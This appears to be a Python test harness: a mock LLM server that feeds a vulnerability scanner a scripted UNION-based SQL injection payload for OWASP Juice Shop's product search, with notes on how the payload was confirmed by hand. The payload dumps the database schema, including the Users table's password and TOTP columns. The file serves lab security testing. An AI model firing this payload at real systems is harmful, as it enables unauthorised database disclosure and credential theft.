#!/usr/bin/env python3
"""Minimal OpenAI-compatible (non-streaming) mock LLM server for
auto_vuln_scanner.py's --llm-class, scripted for OWASP Juice Shop's product
search (/rest/products/search), demonstrating the UNION-based full-schema-
disclosure finding. Sibling of mock_llm_server_juiceshop_open_redirect.py
(same wire protocol, same "not a general-purpose LLM stand-in" caveat) --
see that file's docstring for the full explanation of what this is and is
not. The difference here: this finding uses the reflected_marker detect
type (the Open Redirect one uses the same type too, but on a different
field), chosen because the schema dump adds unmistakable literal text
("CREATE TABLE `Users`") that cannot appear in a normal product-search
response.

The payload and marker were confirmed BY HAND first (2026-11-27, see
security-scan/sqli-lab-coverage.ja.md's "③UNIONベース" entry): probing
column counts 1..15 found that 9 errors ("...do not have the same number
of result columns") while 10 succeeds, and with `'))` as the closing
syntax, substituting `sql` for one column and selecting `FROM
sqlite_master` returns every table's CREATE TABLE statement, including
Users (`email`, `password`, `role`, `totpSecret`, ...).

Usage:
    python3 mock_llm_server_juiceshop_union.py [port]   # default 11434

Then, against your own locally-run Juice Shop (bkimminich/juice-shop):
    python3 auto_vuln_scanner.py \\
        --url http://127.0.0.1:3000/rest/products/search \\
        --baseline q=zzz \\
        --fuzz q \\
        --llm-class "SQLi UNION (全テーブル定義の取得)" \\
        --llm-url http://127.0.0.1:11434/v1 \\
        --i-own-this-target
"""
import json
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PAYLOADS = [
    "')) UNION SELECT sql,'2','3','4','5','6','7','8','9','10' FROM sqlite_master--",
]
MARKER = "CREATE TABLE `Users`"

_calls = []


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("[mock-llm-union] " + (fmt % args) + "\n")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        try:
            req = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            req = {}
        _calls.append(req)

        messages = req.get("messages") or []
        user_text = next((m.get("content", "") for m in reversed(messages) if m.get("role") == "user"), "")
        is_class_definition = "detect" in user_text.lower() or "vulnerability class to test for" in user_text.lower()

        if is_class_definition:
            content = json.dumps(
                {"payloads": PAYLOADS, "detect": {"type": "reflected_marker", "marker": MARKER}}
            )
        else:
            content = "\n".join(PAYLOADS)

        print(
            f"=== call {len(_calls)}: model={req.get('model')} "
            f"messages={len(messages)} -> scripted {'class-definition' if is_class_definition else 'payload-list'} reply",
            file=sys.stderr,
        )

        body = {
            "id": f"mock-{len(_calls)}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": req.get("model", "mock-model"),
            "choices": [{"index": 0, "message": {"role": "assistant", "content": content}, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        }
        payload = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"mock llm ok (juiceshop union-schema script)")


def main() -> int:
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 11434
    srv = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    print(f"[mock-llm-union] listening on http://127.0.0.1:{port}/v1 (POST .../chat/completions)", file=sys.stderr)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
